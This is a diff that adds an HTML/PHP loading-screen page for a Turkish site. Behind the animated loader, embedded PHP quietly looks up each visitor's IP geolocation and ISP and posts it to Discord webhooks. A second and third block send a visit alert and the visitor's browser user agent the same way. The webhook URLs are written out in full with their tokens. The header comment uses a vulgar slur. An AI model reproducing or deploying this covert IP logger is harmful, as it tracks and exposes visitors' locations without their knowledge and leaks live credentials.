@@ -1,0 +1,114 @@
+<!--
+/*----------------------------------------------
+*
+* [Preloader Screen - Meta and Data Screen]
+*
+* Theme    : Orospu pazarı
+* Version  : 0
+* Author   : aarda
+* Support  : bit.ly/ardadasdelen
+* 
+----------------------------------------------*/
+-->
+
+
+<html>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="developed by aarda" />
+  <meta name="author" content="aarda" />
+  <link rel="manifest" href="aarda.json" />
+  <title>Antibeyto Cumhuriyeti 👑</title>
+    <style>
+@import url(https://fonts.googleapis.com/css?family=Poppins);@keyframes top-box{0%{top:0}25%{transform:scale(1) rotate(45deg)}50%{top:128px;transform:scale(2) rotate(225deg)}75%{transform:scale(1) rotate(225deg)}to{top:0;transform:rotate(225deg)}}@keyframes bottom-box{0%{top:0}25%{transform:scale(1) rotate(45deg)}50%{top:-128px;transform:scale(2) rotate(225deg)}75%{transform:scale(1) rotate(225deg)}to{top:0;transform:rotate(225deg)}}@keyframes middle-box{0%{transform:scale(0) rotate(45deg)}30%{transform:scale(0) rotate(100deg)}50%{transform:scale(3) rotate(225deg)}90%,to{transform:scale(0) rotate(225deg)}}body{background:#000000;display:flex;flex-direction:column;align-items:center;justify-content:center;position:fixed!important;top:0;right:0;bottom:0;left:0;font-family:'Poppins',cursive}a{color:#fc0}.white{width:80px;height:80px;background-color:red;border-radius:0px}.top{position:relative;animation-name:top-box}.bottom,.middle,.top{transform:rotate(45deg);margin:auto;animation-duration:3s;animation-iteration-count:infinite}.middle{width:50px;height:50px;background-color:#101010;z-index:100;animation-name:middle-box}.bottom{background-color:red;position:relative;z-index:50;animation-name:bottom-box}.loader-container{background:#000000;width:400px;height:400px;display:flex;flex-direction:column;align-items:center;justify-content:center}i{color: white}
+    </style>
+  <body>
+  <div class="loader-container">
+    <div class="top box white"></div>
+    <div class="middle box"></div>
+    <div class="bottom box white"></div>
+  </div>
+    <i>Antibeyto Cumhuriyet'i yükleniyor...</i>
+    <meta http-equiv="refresh" content="3;url=/biz-kimiz">
+<?php
+$ip = $_SERVER['REMOTE_ADDR']; 
+$apiUrl = "http://ip-api.com/json/{$ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
+
+$response = file_get_contents($apiUrl); 
+
+$data = json_decode($response); 
+
+if ($data->status == 'success') {
+    $message = "IP: {$ip}\n";
+    foreach ($data as $key => $value) {
+        if (!empty($value)) {
+            $message .= "{$key}: {$value}\n";
+        }
+    }
+
+    $webhookUrl = "https://discord.com/api/webhooks/1118596874740437063/_SSpVAqIwJOyb7_1BUY62PqgrF92SfY1cR0FEnbQ9cvWPsFJBNppJ3yKxNXGmJ5_j8iY";
+
+
+    $postData = json_encode(array('content' => $message));
+    $ch = curl_init($webhookUrl);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+    $result = curl_exec($ch);
+    curl_close($ch);
+
+    echo "konsola çıktı falan atarız diye :d";
+} else {
+    echo "arklarla akşamüstü kodlamıştık :p";
+}
+?>
+<?php
+$webhook_url = 'https://discord.com/api/webhooks/1087713151128195093/UbcPhw2mutKedM_sLv_2P3LwAWhCa565LKpBaPvkDtYNKoGExTk8Zvpb7HpL3EB__tkA';
+$data = array('content' => 'Yeni bir kullanıcı siteye girdi!');
+$payload = json_encode($data);
+$ch = curl_init($webhook_url);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+?>
+<?php
+  $webhookUrl = 'https://discord.com/api/webhooks/1087713151128195093/UbcPhw2mutKedM_sLv_2P3LwAWhCa565LKpBaPvkDtYNKoGExTk8Zvpb7HpL3EB__tkA';
+  $userAgent = $_SERVER['HTTP_USER_AGENT'];
+  $data = array('content' => 'Tarayıcı bilgisi: ' . $userAgent);
+  $curl = curl_init($webhookUrl);
+  curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
+  curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
+  curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
+  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+  $response = curl_exec($curl);
+  curl_close($curl);
+?>
+</center>  
+<script>
+function isOnline() {
+  return navigator.onLine;
+}
+if (!isOnline()) {
+  function getCookie(name) {
+    var cookies = document.cookie.split(';');
+    for (var i = 0; i < cookies.length; i++) {
+      var cookie = cookies[i].trim();
+      if (cookie.indexOf(name + '=') === 0) {
+        return cookie.substring(name.length + 1, cookie.length);
+      }
+    }
+    return null;
+  }
+  var loggedIn = getCookie("loggedIn");
+  if (loggedIn === "true") {
+    document.body.innerHTML = "<aarda>luzia<aarda>";
+  } else {
+  }
+}
+</script>
+  </body>
+</html>
